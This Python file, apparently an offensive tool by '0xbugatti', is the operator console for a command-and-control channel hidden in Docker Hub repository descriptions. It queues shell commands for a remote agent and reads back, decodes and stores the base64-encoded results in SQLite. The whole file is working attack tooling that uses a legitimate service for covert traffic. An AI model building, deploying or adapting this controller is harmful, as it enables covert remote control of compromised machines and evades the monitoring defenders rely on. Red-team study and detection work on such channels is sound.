import requests
import time
import textwrap

import argparse
import json
import base64
import shlex
import sqlite3
from tabulate import tabulate
from datetime import datetime, timezone

# Default Credentials (Can be overridden via CLI arguments)
DEFAULT_USERNAME = "USER"
DEFAULT_REPO = "REPO"
DEFAULT_TOKEN = "dckr_pat_XXXXXXXXXXXXXXXXXXXXXX"

# Banner
BANNER = """ 
=========================================
 Docker Hub Overview Manager (JSON Format)
 Developed by 0xbugatti
=========================================
"""

# Help Menu
HELP_TEXT = """ 
Available Commands:
  exec "text"   - Add a new command to be Executed .
  show <ID>     - Retrieve and decode the 'result' field for the given ID.
  setagent-repo <name> - Change the current agent repo.
  read          - Display all C2 connection data in a table.
  save          - Save all connection data to SQLDB (RepoName.db).
  help          - Display this help menu.
  sttop         - Exit the program.
"""

def get_current_overview(username, repo, token):
    api_url = f"https://hub.docker.com/v2/repositories/{username}/{repo}/"
    headers = {"Authorization": f"Bearer {token}"}
    response = requests.get(api_url, headers=headers)

    if response.status_code == 200:
        try:
            current_data = json.loads(response.json().get("full_description", "[]"))
            if len(response.json().get("full_description", "")) > 24000:
                print("⚠️ WARNING: size exceeds 24,000 characters! You will Need To reset DB")
            return current_data if isinstance(current_data, list) else []
        except json.JSONDecodeError:
            return []
    else:
        print(f"❌ ERROR: Failed to  showo data ({response.status_code})")
        return []
    
def create_repository(username, repo, token):
    api_url = "https://hub.docker.com/v2/repositories/"
    headers = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    data = {
        "namespace": username,
        "name": repo,
        "description": f"Auto-created repo: {repo}",
        "is_private": False  # Change to True if you want a private repo
    }

    response = requests.post(api_url, json=data, headers=headers)

    if response.status_code == 201:
        print(f"✅ Repository '{repo}' created successfully.")
        print(f"   URL :https://hub.docker.com/v2/repositories/{username}/{repo}/")

        return True
    elif response.status_code == 409:
        print(f"⚠️ Repository '{repo}' already exists.")
        return True
    else:
        print(f"❌ ERROR: Failed to create repository ({response.status_code}). {response.text}")
        return False

def update_overview(username, repo, token, new_description, user="admin"):

    api_url = f"https://hub.docker.com/v2/repositories/{username}/{repo}/"
    headers = {
        "Authorization": f"Bearer {token}",
        "Content-Type": "application/json"
    }

    current_description = get_current_overview(username, repo, token)
    entry_id = max([entry.get("ID", 0) for entry in current_description], default=0) + 1

    new_entry = {
        "ID": entry_id,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "user": user,
        "description": new_description,
        "result": ""  # Default result is empty
    }

    current_description.append(new_entry)

    data = {"full_description": json.dumps(current_description, indent=2)}
    response = requests.patch(api_url, json=data, headers=headers)

    if response.status_code == 200:
        print(f"✅ Command added to Dockerhub ! (ID: {entry_id})")
    else:
        print(f"❌ Failed to execute: {response.status_code}, {response.text}")


def read_overview(user, repo, token):

    data = get_current_overview(user, repo, token)
    if not data:
        print("⚠️ No data C2 History from the repository.")
        return

    table_data = []
    for entry in data:
        try:
            entry_id = entry.get("ID", "N/A")  # Use 'N/A' if missing
            timestamp = entry.get("timestamp", "Unknown Time")
            user = entry.get("user", "Unknown User")
            description = entry.get("description", "No Description")
            result = entry.get("result", "No Result")
            decoded_result = base64.b64decode(result).decode("utf-8") if result else "No Result"

            table_data.append([entry_id, timestamp, user, description, decoded_result])
        except Exception as e:
            print(f"⚠️ Skipping malformed entry due to error: {e}")

    if table_data:
        print(tabulate(table_data, headers=["ID", "Timestamp", "User", "Description", "Result"], tablefmt="grid"))
    else:
        print("⚠️No data C2 History from the repository.")

def save_overview(user, repo, token):

    import sqlite3

    data = get_current_overview(user, repo, token)
    if not data:
        print("⚠️ C2 History is Empty No Commands Executed By Agent")
        return

    conn = sqlite3.connect(f"{repo}.db")
    cursor = conn.cursor()

    # Ensure the table exists
    cursor.execute("""
        CREATE TABLE IF NOT EXISTS overview (
            ID INTEGER PRIMARY KEY,
            timestamp TEXT DEFAULT 'Unknown Time',
            user TEXT DEFAULT 'Unknown User',
            description TEXT DEFAULT 'No Description',
            result TEXT DEFAULT ''
        )
    """)

    entries = []
    for entry in data:
        try:
            entry_id = entry.get("ID")  # Ensure ID exists
            timestamp = entry.get("timestamp", "Unknown Time")
            user = entry.get("user", "Unknown User")
            description = entry.get("description", "No Description")
            result = entry.get("result", "")

            if entry_id is not None:
                entries.append((entry_id, timestamp, user, description, result))
        except Exception as e:
            print(f"⚠️ Skipping malformed entry due to error: {e}")

    if entries:
        cursor.executemany("INSERT OR IGNORE INTO overview (ID, timestamp, user, description, result) VALUES (?, ?, ?, ?, ?)", entries)
        conn.commit()
        print(f"✅ C2 History Successfully saved {len(entries)} entries to {repo}.db")
    else:
        print("⚠️ C2 History is Empty No Commands Executed By Agent .")

    conn.close()


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="Manage Docker Hub repository overview dynamically.",
        epilog="Example: python script.py --user 0xbugatti --repo testit --token your_token_here"
    )
    parser.add_argument("--user", default=DEFAULT_USERNAME, help="User performing the update.")
    parser.add_argument("--repo", default=DEFAULT_REPO, help="Repository name.")
    parser.add_argument("--token", default=DEFAULT_TOKEN, help="Docker Hub API token.")
    parser.add_argument("--save", action="store_true", help="Save all C2 Connection data to SQLite and exit.")
    parser.add_argument("--read", action="store_true", help="Read all C2 Connection data and exit.")
    parser.add_argument("--new", action="store_true", help="Create the repository if it does not exist.")


    args = parser.parse_args()
    current_repo = args.repo
        # Handle non-interactive modes
    if args.save:
        save_overview(args.user, current_repo, args.token)
        return

    if args.read:
        read_overview(args.user, current_repo, args.token)
        return

    if args.new:
            if not create_repository(args.user, current_repo, args.token):
                return  # Stop execution if creation fails
    while True:
        try:
            raw_input = input(f"{current_repo}> ").strip()
            if raw_input.lower() in ["stop"]:
                print("🔹 Exiting...")
                break

            if raw_input.lower() == "help":
                print(HELP_TEXT)
                continue

            if raw_input.startswith("exec "):
                command = shlex.split(raw_input)
                if len(command) < 2:
                    print("⚠️ Usage: exec \"text to append\"")
                else:
                    new_text = " ".join(command[1:])
                    update_overview(args.user, current_repo, args.token, new_text, args.user)

            elif raw_input.startswith("show "):
                try:
                    _, entry_id = raw_input.split()
                    entry_id = int(entry_id)
                    data = get_current_overview(args.user, current_repo, args.token)

                    found = False
                    for entry in data:
                        if isinstance(entry, dict) and entry.get("ID") == entry_id:
                            result = entry.get("result", "")
                            decoded_result = base64.b64decode(result).decode("utf-8") if result else "⚠️ No result available (maybe not executed)."
                            print(f"💀{entry_id} Command Result:\n")
                            print("\n".join(textwrap.wrap(decoded_result, width=80)))
                            found = True
                            break

                    if not found:
                        print(f"❌ No entry found with ID {entry_id}.")
                except ValueError:
                    print("⚠️ Invalid ID format. Use: show <ID>")
                except Exception as e:
                    print(f"❌ Unexpected error: {e}")

            elif raw_input.startswith("setagent-repo "):
                try:
                    _, new_repo = raw_input.split(maxsplit=1)
                except ValueError:
                    print("⚠️ Invalid syntax! Usage: setagent-repo <repo_name>")
                    continue

                # Check if the repository exists
                check_url = f"https://hub.docker.com/v2/repositories/{args.user}/{new_repo}/"
                headers = {"Authorization": f"Bearer {args.token}"}
                response = requests.get(check_url, headers=headers)

                if response.status_code == 200:
                    current_repo = new_repo
                    print(f"✅ Repository (agent) switched to: {current_repo}")
                elif response.status_code == 404:
                    print(f"❌ ERROR: Repository '{new_repo}' does not exist!")
                elif response.status_code == 403:
                    print("❌ ERROR: Forbidden! Check your token permissions.")
                else:
                    print(f"❌ ERROR: Failed to verify repository ({response.status_code}).")


            elif raw_input.lower() == "read":
                read_overview(args.user, current_repo, args.token)

            elif raw_input.lower() == "save":
                save_overview(args.user, current_repo, args.token)
            elif raw_input.lower() == "reset":
                save_overview(args.user, current_repo, args.token)  # Backup before reset

                api_url = f"https://hub.docker.com/v2/repositories/{args.user}/{current_repo}/"
                headers = {
                    "Authorization": f"Bearer {args.token}",
                    "Content-Type": "application/json"
                }

                # Overwrite with a single default entry
                reset_entry = [{
                    "ID": 1,
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "user": "admin",
                    "description": "",
                    "result": ""
                }]

                reset_data = {"full_description": json.dumps(reset_entry, indent=2)}
                response = requests.patch(api_url, json=reset_data, headers=headers)

                if response.status_code == 200:
                    print("✅ Repository overview has been reset successfully.")
                else:
                    print(f"❌ ERROR: Failed to reset repository ({response.status_code}).")

            else:
                print("⚠️ Invalid command. Use 'help' for available commands.")

        except KeyboardInterrupt:
            print("\n🔹 Exiting...")
            break

if __name__ == "__main__":
    main()
